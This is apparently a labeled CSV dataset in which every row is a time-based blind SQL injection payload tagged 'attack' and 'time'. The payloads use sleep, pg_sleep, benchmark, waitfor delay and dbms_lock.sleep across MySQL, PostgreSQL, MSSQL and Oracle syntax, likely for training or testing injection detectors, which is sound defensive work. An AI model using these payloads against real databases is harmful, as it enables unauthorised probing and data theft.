label,payload,family
attack,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",time
attack,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",time
attack,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1   )    )    or sleep  (  5  )  #,time
attack,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,time
attack,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",time
attack,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,time
attack,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'  )   rlike sleep  (  5  )  #,time
attack,"1"" where 7739  =  7739 and sleep  (  5  )  --",time
attack,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,time
attack,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time
attack,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,time
attack,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",time
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time
attack,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",time
attack,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",time
attack,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",time
attack,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",time
attack,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,time
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,time
attack,1  )   rlike sleep  (  5  )  #,time
attack,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,time
attack,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",time
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,time
attack,1   )    )     )   waitfor delay '0:0:5'--,time
attack,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,time
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",time
attack,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,time
attack,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",time
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",time
attack,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",time
attack,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",time
attack,1'  )   where 7908  =  7908 or sleep  (  5  )  --,time
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,time
attack,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,1 and sleep  (  5  )  -- ruuv,time
attack,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",time
attack,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,time
attack,1%'   )    )    or sleep  (  5  )  #,time
attack,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,time
attack,"select sleep  (  5  )   and ""%""  =  """,time
attack,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,time
attack,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",time
attack,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",time
attack,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,time
attack,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,time
attack,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,time
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,time
attack,1 where 6223  =  6223 rlike sleep  (  5  )  #,time
attack, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,time
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,time
attack,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,time
attack,select sleep  (  5  )   and   (  'dcys' like 'dcys,time
attack,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",time
attack,select pg_sleep  (  5  )  -- ojzt,time
attack,begin dbms_lock.sleep  (  5  ) ,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",time
attack,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",time
attack,"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",time
attack,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",time
attack,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",time
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",time
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time
attack,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,time
attack,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,time
attack,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",time
attack,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",time
attack,1' waitfor delay '0:0:5'--,time
attack,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,time
attack,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",time
attack,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'acdu'  =  'acdu",time
attack,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",time
attack,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',time
attack,1' in boolean mode  )   waitfor delay '0:0:5'#,time
attack,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,time
attack,1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1%""   )    )    rlike sleep  (  5  )  #",time
attack,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,time
attack,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,time
attack,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",time
attack,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,time
attack,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""dyoe""  =  ""dyoe",time
attack,1%'  )   or sleep  (  5  )   and   (  '%'  =  ',time
attack,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,time
attack,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,time
attack,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,time
attack,"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',time
attack,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,time
attack,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,time
attack,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",time
attack,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",time
attack,"1"" where 3227  =  3227 waitfor delay '0:0:5'--",time
attack,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1' and sleep  (  5  )   and 'usgv' like 'usgv,time
attack,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',time
attack,1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,select sleep  (  5  )   and    (    (   '%'  =  ',time
attack,1'   )    )    or sleep  (  5  )  #,time
attack,1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,time
attack,1 where 7224  =  7224 and sleep  (  5  )  #,time
attack,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,time
attack,1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,time
attack,1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,time
attack,"select sleep  (  5  )   and   (  ""%""  =  """,time
attack,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,select sleep  (  5  )   and    (    (   'srfc' like 'srfc,time
attack,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,time
attack,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,time
attack,select sleep  (  5  )   and 'gajm'  =  'gajm,time
attack,"1%'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time
attack,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",time
attack,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",time
attack,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",time
attack,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",time
attack,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",time
attack,1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,time
attack,1'   )    )     )   and sleep  (  5  )  #,time
attack,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,time
attack,"1""   )    )     )   waitfor delay '0:0:5'--",time
attack,"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,time
attack,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,time
attack,1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",time
attack,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,time
attack,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",time
attack,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,time
attack,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,time
attack,1'   )    )     )   rlike sleep  (  5  )  #,time
attack,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,time
attack,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,time
attack,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",time
attack,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,time
attack,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",time
attack,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",time
attack,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",time
attack,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time
attack,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,time
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",time
attack,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,time
attack,1%' rlike sleep  (  5  )  #,time
attack,1%' or sleep  (  5  )   and '%'  =  ',time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,time
attack,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",time
attack,"waitfor delay '0:0:5' and ""%""  =  """,time
attack,1%' waitfor delay '0:0:5' and '%'  =  ',time
attack,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",time
attack,1%'   )    )     )   and sleep  (  5  )  #,time
attack,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'wuux'  =  'wuux,time
attack,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',time
attack,waitfor delay '0:0:5'--,time
attack,1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  1601  =  1601,time
attack,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",time
attack,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",time
attack,1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,select sleep  (  5  )  #,time
attack,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",time
attack,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",time
attack,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",time
attack,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,time
attack,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",time
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",time
attack,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",time
attack,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",time
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",time
attack,waitfor delay '0:0:5' and    (    (   7619  =  7619,time
attack,select sleep  (  5  )   and    (    (   3404  =  3404,time
attack,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,time
attack,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",time
attack,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,time
attack,1' and sleep  (  5  ) ,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",time
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",time
attack,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,select sleep  (  5  )  -- waln,time
attack,"1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",time
attack,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,select sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,time
attack,select sleep  (  5  )   and 'eskp' like 'eskp,time
attack,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,time
attack,"1%"" rlike sleep  (  5  )   and ""%""  =  """,time
attack,1' in boolean mode  )   and sleep  (  5  )  #,time
attack,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,time
attack,"1%""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""%""  =  """,time
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,time
attack,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,time
attack,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',time
attack,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",time
attack,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
